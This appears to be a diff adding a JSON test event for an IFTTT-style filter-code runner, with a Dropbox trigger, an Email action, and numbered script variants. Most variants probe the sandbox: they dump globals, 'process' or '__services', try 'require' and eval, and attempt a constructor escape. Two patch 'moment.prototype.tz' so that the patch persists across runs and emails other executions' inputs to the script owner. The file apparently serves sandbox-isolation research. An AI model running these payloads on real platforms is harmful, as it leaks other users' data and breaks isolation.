@@ -1,0 +1,42 @@
+{
+  "resource": "/IFTTT-instance",
+  "path": "/IFTTT-instance",
+  "httpMethod": "POST",
+  "body": {
+    "scriptCode":  "console.log('test'); Email.sendMeEmail.setBody(Dropbox.newFileInFolder + ' added! @ ' + Meta.currentUserTime.hour() ); Email.sendMeEmail.setSubject(\"dropbox-notification\");",
+    "0scriptCode": "var log=''; var cnt=''; if (moment.prototype.hasOwnProperty('_counter') && moment.prototype.hasOwnProperty('_ex')) {     cnt=moment.prototype._counter.toString();     log='counter: '+cnt+' data: '+moment.prototype._ex; } else {    log='counter does not exist, initializaing to 0';    moment.prototype._counter=0;    moment.prototype._ex='';    let _tz = moment.prototype.tz;    function tz(x) {  moment.prototype._counter++;  let str = x === undefined ? 'no input' : JSON.stringify(x); moment.prototype._ex=moment.prototype._ex+str;  return _tz.call(this,x)    };    moment.prototype.tz=tz;};var currentTime = new Date();var t=moment(currentTime); var s=t.tz('Europe/Stockholm'); Email.sendMeEmail.setBody(s.format()+' '+log)",
+    "1scriptCode" : "var s = 'd'; moment.prototype.constructor.constructor('console.log();')()",
+    "2scriptCode" : "console.log('filtercode');",
+    "3scriptCode":  "eval(`console.log('evaltest'); Email.sendMeEmail.setBody(Dropbox.newFileInFolder + ' added! @ ' + Meta.currentUserTime.hour() ); Email.sendMeEmail.setSubject(\"dropbox-notification\")`);",
+    "4scriptCode" : "var s = JSON.stringify(__services); Email.sendMeEmail.setBody(s);",
+    "5scriptCode" : "console.log(Meta.triggerTime); let currentHour = Meta.currentUserTime.hour();",
+    "6scriptCode" : "require('fs');",
+    "7scriptCode" : "require('moment-timezone');",
+    "8scriptCode" : "console.log(moment)",
+    "9scriptCode" : "console.log(Object.getOwnPropertyNames(this))",
+    "10scriptCode" : "console.log(Object.getOwnPropertyNames(global))",
+    "11scriptCode" : "console.log(process)",
+    "12scriptCode" : "var log=''; var cnt=''; if (moment.prototype.isBetween != 0 ) {     cnt=moment.prototype.isBetween.toString();     log='counter: '+cnt+' data: '+moment.prototype._ex; } else {    log='counter does not exist, initializaing to 0';    moment.prototype.isBetween=0;    moment.prototype._ex='';    let _tz = moment.prototype.tz;    function tz(x) {  moment.prototype.isBetween++;  let str = x === undefined ? 'no input' : JSON.stringify(x); moment.prototype._ex=moment.prototype._ex+str;  return _tz.call(this,x)    };    moment.prototype.tz=tz;};var currentTime = new Date();var t=moment(currentTime); var s=t.tz('Europe/Stockholm'); Email.sendMeEmail.setBody(s.format()+' '+log)",
+    "13scriptCode" : "console.log(__services)",
+    "config": {
+      "currentTime": "2020-04-23T18:25:43.511Z",
+      "timeZone": "GMT",
+      "triggerTime": "2020-04-23T19:25:43.511Z",
+      "trigger": {
+        "ingredients": "filename",
+        "serviceName": "Dropbox",
+        "name": "newFileInFolder"
+      },
+      "actions": [
+        {
+          "serviceName": "Email",
+          "name": "sendMeEmail",
+          "fields": [
+            "Body",
+            "Subject"
+          ]
+        }
+      ]
+    }
+  }
+}
